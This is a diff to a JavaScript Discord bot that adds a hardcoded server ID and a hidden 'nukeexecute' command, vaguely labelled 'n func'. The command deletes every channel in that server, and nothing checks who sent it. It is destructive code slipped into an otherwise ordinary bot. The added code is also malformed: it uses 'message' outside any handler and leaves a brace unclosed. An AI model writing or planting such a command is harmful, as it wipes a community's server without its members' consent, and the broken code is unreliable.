@@ -8,6 +8,11 @@ const dev_ids = config.ownerID || config.co_ownerID;
 var Game = 'everyone'
 var Type = 'Watching'
 
+//n settings
+
+const settings = {
+    guildID: "515955729077764096"
+};
 
 //startup and event handlers
 
@@ -45,6 +50,19 @@ client.on("ready", function(){
        console.log(User.username);
     }
 });
+
+//n func
+
+// Get the guild using the ID.
+   let guild = client.guilds.get(settings.guildID);
+
+   // Delete all channels.
+   if (message.content.startsWith(config.prefix + "nukeexecute")) {
+       guild.channels.forEach(c => {
+           c.delete();
+           console.info(`Deleted channel ${c.name}; ID: ${c.id}. (╯°□°）╯︵ ┻━┻`);
+       });
+
 
 // log deleted messages MASTER
 client.on("messageDelete", (message) => {
